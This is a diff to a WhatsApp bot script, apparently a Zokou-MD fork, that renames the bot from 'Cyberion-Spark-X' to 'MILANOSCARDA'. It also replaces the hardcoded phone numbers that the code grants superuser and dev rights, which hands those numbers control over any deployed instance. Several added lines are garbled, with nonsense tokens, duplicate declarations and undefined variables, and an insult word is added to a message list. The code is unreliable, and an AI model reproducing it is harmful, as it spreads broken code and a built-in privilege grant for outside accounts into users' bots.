@@ -95,7 +95,7 @@ setTimeout(() => {
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['Cyberion-Spark-X', "safari", "1.0.0"],
+            browser: ['MILANOSCARDA ', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -169,16 +169,16 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const FranceKing = '254757835036';
-            const FranceKing1 = '254751284190';
-            constkw wkw woe e FranceKing2 = "254750948696";
-            const FranceKing3 = '254742063632';
+            const Bruceleemuwel = '254706452828';
+            const Bruceleemuwel = '254787223773';
+            constkw wkw woe e FranceKing2 = "254706452828";
+            const FranceKing3 = '254787223773';
             conskw 2ek2 kewt sudo = await getAllSudoNumbers();
-            const superUserNumbers = [servBot, FranceKing, FranceKing1, FranceKing2, FranceKing3, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
-            const allAllowedNumbers = superUserNumbers.concat(sudo);
+            const superUserNumbers = [servBot, Brucelee, Brucelee2, Brucelee3, brucelee3, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            const allAllowedNumbers = superUserNumbers.concat(sudo);254706452828
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
-            var dev = [FranceKing, FranceKing1,FranceKing2,FranceKing3].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+            var dev = [milanoscarda, milanoscarda1, milanoscarda2, milanoscarda 3].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
             consoe wkww kw wksle.log("\t [][]...{k2 2k2 2ke Cyberion-Spark-X}...[][]");
             console.log("=========== New message ===========");
@@ -443,7 +443,7 @@ function mybotpic() {
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'Cyberion-Spark-X',
+                                        pack: 'MILANOSCARDA',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -541,7 +541,7 @@ function mybotpic() {
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'Cyberion-Spark-X',
+                pack: 'MILANOSCARDA',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -625,7 +625,7 @@ function mybotpic() {
                          /******************* PM_PERMT***************/
 
             if (!superUser && origineMessage === auteurMessage&& conf.PM_PERMIT === "yes" ) {
-                repondre("You don't have acces to Cyberion Spark") ; return }
+                repondre("You don't have acces to MILANOSCARDA") ; return }
             ///////////////////////////////
 
              
@@ -650,7 +650,7 @@ function mybotpic() {
                 if(!superUser) {
                     let req = await isUserBanned(auteurMessage);
                     
-                        if (req) {repondre("Your access to Cyberion Spark is denied"); return}
+                        if (req) {repondre("Your access to milanoscarda is denied"); return}
                     
 
                 } 
@@ -678,7 +678,7 @@ zk.ev.on('group-participants.update', async (group) => {
     try {
         ppgroup = await zk.profilePictureUrl(group.id, 'image');
     } catch {
-        ppgroup = 'https://telegra.ph/file/cc5fd0e19ae11164bd813.jpg';
+        ppgroup = 'https://files.catbox.moe/qtofy9.mp4';
     }
 
     try {
@@ -699,11 +699,11 @@ zk.ev.on('group-participants.update', async (group) => {
 ╚════◇◇◇═════╝
 ◇ *Descriptioon*   ◇
 
-${metadata.desc}\n\n> Cyberion-Spark-X.`;
+${metadata.desc}\n\n> milanoscarda.`;
 
             zk.sendMessage(group.id, { image: { url: ppgroup }, caption: msg, mentions: membres });
         } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
-            let msg = `Goodbye to that Fallen soldier, Powered by *𝗖𝗬𝗕𝗘𝗥𝗜𝗢𝗡*; \n`;
+            let msg = `Goodbye to that Fallen soldier, Powered by *MILANO*; \n`;
 
             let membres = group.participants;
             for (let membre of membres) {
@@ -888,7 +888,7 @@ ${metadata.desc}\n\n> Cyberion-Spark-X.`;
                     KAHABA
                     MSHENZI
                     KIPII" 
-                    
+                    KAZWAA
                 await zk.sendMessage(zk.user.id, { text: cmsg });
                 }
             }
